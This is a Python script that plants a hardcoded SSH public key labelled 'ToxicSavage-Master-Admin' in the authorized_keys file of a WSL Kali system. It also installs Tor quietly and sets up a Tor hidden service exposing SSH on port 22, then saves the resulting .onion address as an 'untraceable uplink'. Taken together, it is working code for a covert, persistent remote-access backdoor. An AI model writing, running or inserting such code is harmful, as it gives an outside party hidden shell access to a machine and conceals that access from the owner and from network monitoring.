import os
import subprocess
import sys
import json

# Hardcoded Master Public Key for ToxicSavage
MASTER_PUB_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAXQM+7xmlACIDN3Eb9kK72kdXoAdKTUzIOf3FwW8oy9 ToxicSavage-Master-Admin"

def setup_master_access():
    print("MASTER_ACCESS: Initializing Secure Untraceable Uplink...")
    
    # 1. Setup SSH Authorized Keys in WSL Kali
    try:
        # Ensure .ssh exists and has correct permissions, then append key
        setup_cmd = f'''
        mkdir -p ~/.ssh
        chmod 700 ~/.ssh
        if ! grep -q "{MASTER_PUB_KEY}" ~/.ssh/authorized_keys 2>/dev/null; then
            echo "{MASTER_PUB_KEY}" >> ~/.ssh/authorized_keys
            chmod 600 ~/.ssh/authorized_keys
            echo "SSH_KEY_AUTHORIZED"
        fi
        '''
        subprocess.run(["wsl", "-d", "kali-linux", "bash", "-c", setup_cmd], check=True)
        print("MASTER_ACCESS: SSH identity verified and authorized.")
    except Exception as e:
        print(f"MASTER_ACCESS: Error authorizing SSH key: {e}")

    # 2. Configure Tor Hidden Service for Anonymity
    try:
        # Check if Tor is installed
        check_tor = subprocess.run(["wsl", "-d", "kali-linux", "which", "tor"], capture_output=True)
        if check_tor.returncode != 0:
            print("MASTER_ACCESS: Tor not found. Attempting background installation...")
            # We try to install it silently
            subprocess.run(["wsl", "-d", "kali-linux", "sudo", "apt-get", "install", "-y", "tor"], capture_output=True)
            
        # Verify installation again
        check_tor = subprocess.run(["wsl", "-d", "kali-linux", "which", "tor"], capture_output=True)
        if check_tor.returncode == 0:
            # Configure Hidden Service
            torrc_config = """
HiddenServiceDir /var/lib/tor/nexus_master_ssh/
HiddenServicePort 22 127.0.0.1:22
"""
            # Use a temporary file to safely append to torrc
            config_cmd = f'''
            if ! grep -q "nexus_master_ssh" /etc/tor/torrc 2>/dev/null; then
                echo '{torrc_config}' | sudo tee -a /etc/tor/torrc > /dev/null
                sudo mkdir -p /var/lib/tor/nexus_master_ssh/
                sudo chown -R debian-tor:debian-tor /var/lib/tor/nexus_master_ssh/
                sudo chmod 700 /var/lib/tor/nexus_master_ssh/
                sudo service tor restart
            fi
            '''
            subprocess.run(["wsl", "-d", "kali-linux", "bash", "-c", config_cmd], check=True)
            
            # Retrieve the .onion address
            get_onion = subprocess.run(["wsl", "-d", "kali-linux", "sudo", "cat", "/var/lib/tor/nexus_master_ssh/hostname"], capture_output=True, text=True)
            if get_onion.returncode == 0:
                onion_address = get_onion.stdout.strip()
                print(f"MASTER_ACCESS_UPLINK: {onion_address}")
                
                # Save to a local secure file for the user
                with open("MASTER_UPLINK.json", "w") as f:
                    json.dump({
                        "user": "ToxicSavage",
                        "onion_address": onion_address,
                        "port": 22,
                        "status": "SECURE_UNTRACEABLE_ACTIVE"
                    }, f, indent=4)
            else:
                print("MASTER_ACCESS: Tor service active but hostname not yet generated. Check back in 60s.")
        else:
            print("MASTER_ACCESS: Tor installation failed or requires manual intervention.")
    except Exception as e:
        print(f"MASTER_ACCESS: Error during Tor configuration: {e}")

if __name__ == "__main__":
    setup_master_access()
